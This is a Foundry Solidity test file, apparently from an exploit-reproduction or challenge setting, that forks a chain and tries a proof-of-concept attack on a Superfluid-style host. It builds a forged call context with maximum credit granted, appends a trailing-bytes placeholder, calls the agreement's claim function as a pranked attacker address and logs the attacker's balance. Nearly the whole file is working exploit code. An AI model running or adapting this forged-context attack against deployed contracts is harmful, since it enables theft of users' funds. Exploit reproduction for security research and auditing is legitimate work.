// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// ContextUtils not needed

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory);
    function decodeCtx(bytes memory ctx) external pure returns (
        uint8 appCallbackLevel, uint8 callType, uint256 timestamp,
        address msgSender, bytes4 agreementSelector, bytes memory userData,
        uint256 appCreditGranted, uint256 appCreditWanted,
        int256 appCreditUsed, address appAddress, address appCreditToken
    );
}

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
}

interface ISuperToken {
    function balanceOf(address) external view returns (uint256);
}

contract ForgedCreditTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUBSCRIBER = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_forgedCreditClaim() public {
        // Build forged ctx with appCreditGranted = MAX
        // Using ContextUtils to build a properly encoded context
        bytes memory fakeCtx = _buildForgedCtx();
        
        // Build claim calldata with trailing-bytes trick
        bytes memory inner = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            PUBLISHER,
            uint32(1),
            SUBSCRIBER,
            fakeCtx  // forged ctx with inflated credit
        );
        
        // Append empty placeholder for Host to replace
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        
        console.log("=== Attempting forged credit claim ===");
        console.log("Attacker balance before:", ATTACKER.balance);
        
        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, outer, "") returns (bytes memory retCtx) {
            console.log("Claim SUCCEEDED");
            console.log("Returned ctx length:", retCtx.length);
            
            // Decode returned ctx to see what appCreditGranted came back
            if (retCtx.length > 0) {
                (,,,,,, uint256 creditGranted,, int256 creditUsed,,) = 
                    ISuperfluid(HOST).decodeCtx(retCtx);
                console.log("Returned appCreditGranted:", creditGranted);
                console.log("Returned appCreditUsed:", creditUsed);
            }
        } catch (bytes memory err) {
            console.log("Claim FAILED");
            console.logBytes4(bytes4(err));
        }
        
        console.log("Attacker balance after:", ATTACKER.balance);
    }

    function _buildForgedCtx() internal pure returns (bytes memory) {
        // Encode a context struct manually
        // ctx1 block: callInfo, timestamp, msgSender, agreementSelector, userData
        uint256 callInfo = 1 << 32; // callType=AGREEMENT, appLevel=0
        uint256 timestamp = 1649749699; // fork block timestamp
        address msgSender = ATTACKER;
        bytes4 agreementSelector = IIDA.claim.selector;
        bytes memory userData = "";
        
        // ctx2 block: appAllowanceGranted|appAllowanceWanted, appAllowanceUsed, appAddress, appAllowanceToken
        uint256 allowanceIO = uint256(type(uint128).max); // appCreditGranted = MAX!
        int256 appCreditUsed = 0;
        address appAddress = address(0);
        address appCreditToken = MATICx;
        
        return abi.encode(
            abi.encode(callInfo, timestamp, msgSender, agreementSelector, userData),
            abi.encode(allowanceIO, appCreditUsed, appAddress, appCreditToken)
        );
    }
}
